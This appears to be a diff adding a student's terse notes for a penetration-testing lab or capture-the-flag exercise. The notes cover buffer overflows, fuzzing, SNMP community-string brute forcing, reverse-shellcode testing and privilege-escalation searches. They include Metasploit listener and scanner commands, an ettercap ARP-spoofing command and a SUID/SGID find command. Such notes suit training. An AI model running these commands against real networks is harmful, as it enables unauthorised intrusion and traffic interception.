@@ -1,0 +1,86 @@
+https://10.10.10.100/login
+1 person registers
+
+
+linux:
+ret2c
+stripped
+canary
+aslr
+
+
+windows:
+simple buffer overlow + crypto and be careful of reordering
+ftp running no dep buffer overflow 
+forks need sleep too/ 
+day 3 in bonus section yahoo player exercise
+
+
+
+# set up a listener
+use windows/multi/handler
+set lport 4444
+set lhost 10.10.77.X
+exploit
+
+
+
+
+0. trivia 1 
+	5d64b71392b1e00a3ad893db02d381d58262c2d6
+1. fuzzer
+	must grep for key
+	Taof- on windows
+	day 3 pg. 146/164-170/256-264
+	# to install sulley on linux do these next 2 lines
+	git clone https://github.com/OpenRCE/sulley
+	python sulley/setup.py install
+	python /root/lab/sulley/network_monitor.py -d 0 -f "port 80" -P audits
+	look in 
+2. snmp
+	day 1 pg. 227
+	nmap -sU -p161 -A 10.10.10.X (check for a string next to the version that says "public", that is the community string)
+	
+	msfconsole
+		use auxiliary/scanner/snmp/snmp_login
+		set rhosts 10.10.10.X
+		set verbose false
+		set threads 4
+		exploit
+		#note, this will not stop once it guesses a community string because it is looking for read as well as read/write codes
+
+	snmpcheck -t 10.10.10.X
+	snmpcheck -t 10.10.10.X -c [communitystring]
+
+	ettercap -TqM arp:remote /10.10.77.X/ //
+
+	auxiliary/scanner/snmp/community
+	perl snmpblow.pl and arguments pg 241
+	perl snmpfuzz.pl --host= --port= --
+	a million metasploit modules
+3. trivia
+	echo [answer] | sha1sum
+4. reverse shellcode
+	put shellcode into checker.c and compile (instructions are at the bottom of the program)
+	netstat -na > first
+	adduser test (go through steps of creating new user)
+	su test
+	./checker
+	id (copy the output)
+	su root (then put in toor as password)
+	echo "[the line you copied earlier]" > first_id
+	id > second_id
+	netstat -na > second
+	diff first second
+	diff first_id second_id
+
+	IDA
+5. traversing
+	find / -perm -2000 -o -perm -4000; sudo -l;	
+6. windows 1 
+	maybe day 3 pg. 57	
+
+	
+
+
+
